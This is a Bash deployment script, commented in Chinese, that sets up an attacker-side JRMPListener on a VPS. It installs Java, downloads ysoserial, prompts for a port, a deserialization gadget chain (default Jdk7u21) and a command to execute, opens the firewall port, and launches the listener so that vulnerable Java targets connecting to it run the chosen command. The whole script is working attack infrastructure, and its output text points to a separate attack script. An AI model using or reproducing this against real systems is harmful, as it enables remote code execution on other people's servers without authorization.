#!/bin/bash
# VPS 端 JRMPListener 快速部署脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  JRMPListener 快速部署脚本${NC}"
echo -e "${GREEN}========================================${NC}"
echo

# 检查是否为 root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${YELLOW}[!] 建议使用 root 权限运行${NC}"
fi

# 1. 检查 Java
echo -e "${YELLOW}[*] 检查 Java 环境...${NC}"
if command -v java &> /dev/null; then
    JAVA_VERSION=$(java -version 2>&1 | head -n 1)
    echo -e "${GREEN}[+] Java 已安装: ${JAVA_VERSION}${NC}"
else
    echo -e "${RED}[!] 未安装 Java，正在安装...${NC}"
    
    # 检测系统类型
    if [ -f /etc/debian_version ]; then
        # Debian/Ubuntu
        echo -e "${YELLOW}[*] 检测到 Debian/Ubuntu 系统${NC}"
        apt-get update
        apt-get install -y openjdk-11-jdk wget
        
    elif [ -f /etc/redhat-release ]; then
        # CentOS/RHEL
        echo -e "${YELLOW}[*] 检测到 CentOS/RHEL 系统${NC}"
        yum install -y java-11-openjdk java-11-openjdk-devel wget
        
    else
        echo -e "${RED}[!] 无法识别系统类型，请手动安装 Java${NC}"
        exit 1
    fi
    
    # 再次检查
    if command -v java &> /dev/null; then
        echo -e "${GREEN}[+] Java 安装成功${NC}"
    else
        echo -e "${RED}[!] Java 安装失败${NC}"
        exit 1
    fi
fi

# 2. 下载 ysoserial
echo
echo -e "${YELLOW}[*] 检查 ysoserial.jar...${NC}"
if [ ! -f "ysoserial.jar" ]; then
    echo -e "${YELLOW}[*] 下载 ysoserial...${NC}"
    
    # 尝试多个下载源
    if wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -O ysoserial.jar 2>/dev/null; then
        echo -e "${GREEN}[+] 下载成功${NC}"
    elif wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial.jar 2>/dev/null; then
        echo -e "${GREEN}[+] 下载成功 (备用源)${NC}"
    else
        echo -e "${RED}[!] 下载失败，请手动上传 ysoserial.jar${NC}"
        echo -e "${YELLOW}[*] 或使用 scp 上传:${NC}"
        echo -e "    scp ysoserial.jar root@YOUR_VPS_IP:~/"
        exit 1
    fi
else
    echo -e "${GREEN}[+] ysoserial.jar 已存在${NC}"
fi

# 3. 获取配置
echo
echo -e "${YELLOW}[*] 配置监听参数${NC}"
read -p "监听端口 (默认 1099): " PORT
PORT=${PORT:-1099}

read -p "使用的 Gadget (默认 Jdk7u21): " GADGET
GADGET=${GADGET:-Jdk7u21}

read -p "要执行的命令 (默认 whoami): " CMD
CMD=${CMD:-whoami}

echo
echo -e "${GREEN}[*] 配置信息:${NC}"
echo -e "    端口: ${PORT}"
echo -e "    Gadget: ${GADGET}"
echo -e "    命令: ${CMD}"
echo

# 4. 检查端口
echo -e "${YELLOW}[*] 检查端口 ${PORT} 是否被占用...${NC}"
if netstat -tuln 2>/dev/null | grep -q ":${PORT} "; then
    echo -e "${RED}[!] 端口 ${PORT} 已被占用${NC}"
    netstat -tuln | grep ":${PORT}"
    exit 1
fi

# 5. 配置防火墙
echo -e "${YELLOW}[*] 配置防火墙...${NC}"
if command -v firewall-cmd &> /dev/null; then
    firewall-cmd --zone=public --add-port=${PORT}/tcp --permanent 2>/dev/null
    firewall-cmd --reload 2>/dev/null
    echo -e "${GREEN}[+] firewalld 规则已添加${NC}"
elif command -v ufw &> /dev/null; then
    ufw allow ${PORT}/tcp 2>/dev/null
    echo -e "${GREEN}[+] ufw 规则已添加${NC}"
elif command -v iptables &> /dev/null; then
    iptables -A INPUT -p tcp --dport ${PORT} -j ACCEPT 2>/dev/null
    echo -e "${GREEN}[+] iptables 规则已添加${NC}"
fi

# 6. 启动监听
echo
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  启动 JRMPListener${NC}"
echo -e "${GREEN}========================================${NC}"
echo
echo -e "${YELLOW}[!] 监听器将在前台运行，按 Ctrl+C 停止${NC}"
echo -e "${YELLOW}[!] 在另一个终端运行攻击脚本${NC}"
echo
echo -e "${GREEN}[*] 监听命令:${NC}"
echo -e "    java -cp ysoserial.jar ysoserial.exploit.JRMPListener ${PORT} ${GADGET} '${CMD}'"
echo
sleep 2

# 启动监听
java -cp ysoserial.jar ysoserial.exploit.JRMPListener ${PORT} ${GADGET} "${CMD}"
